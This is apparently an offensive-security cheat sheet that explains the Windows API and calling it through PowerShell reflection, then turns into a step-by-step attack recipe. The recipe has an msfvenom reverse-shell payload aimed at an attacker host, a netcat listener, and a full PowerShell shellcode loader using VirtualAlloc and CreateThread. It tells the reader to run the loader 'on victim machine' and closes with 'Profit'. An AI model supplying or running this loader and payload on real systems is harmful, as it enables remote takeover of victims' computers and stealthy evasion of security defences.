# Windows Application Programming Interface (API)

Windows API: 

The Windows Application Programming Interface (API) allows programs to interact with the underlying operating system, giving them access to essential system-level functions such as memory management, file operations, and networking. It serves as a bridge between the application and the operating system, enabling efficient resource handling. The Windows API is crucial because many exploitation techniques and malware rely on it to manipulate processes, allocate memory, and execute shellcodes. Common Windows API functions frequently used by malicious actors include VirtualAlloc, CreateThread, WaitForSingleObject, etc.

## Techniques

Accessing Windows API through PowerShell Reflection: 

Windows API via PowerShell Reflection is an advanced technique that enables dynamic interaction with the Windows API from PowerShell. Instead of relying on precompiled binaries, PowerShell Reflection allows attackers to call Windows API functions directly at runtime. This will enable them to manipulate low-level system processes, making it a primary tool for bypassing security mechanisms, interacting with the operating system, and executing code stealthily.

## Tools

###  msfvenom

### Example usage:

#### 1) Generate shellcode that will run using powershell

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f powershell

#### 2) Setup listener

    nc -lvnp ATTACKER_PORT

#### 3) Find a way to run this code snippet on victim machine. Code is in C#

    $VrtAlloc = @"
    using System;
    using System.Runtime.InteropServices;

    public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
    }
    "@

    Add-Type $VrtAlloc 

    $WaitFor= @"
    using System;
    using System.Runtime.InteropServices;

    public class WaitFor{
     [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
    }
    "@

    Add-Type $WaitFor

    $CrtThread= @"
    using System;
    using System.Runtime.InteropServices;

    public class CrtThread{
     [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
    }
    "@
    Add-Type $CrtThread   

    [Byte[]] $buf = SHELLCODE_PLACEHOLDER
    [IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
    $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
    [WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")

#### 4) Profit
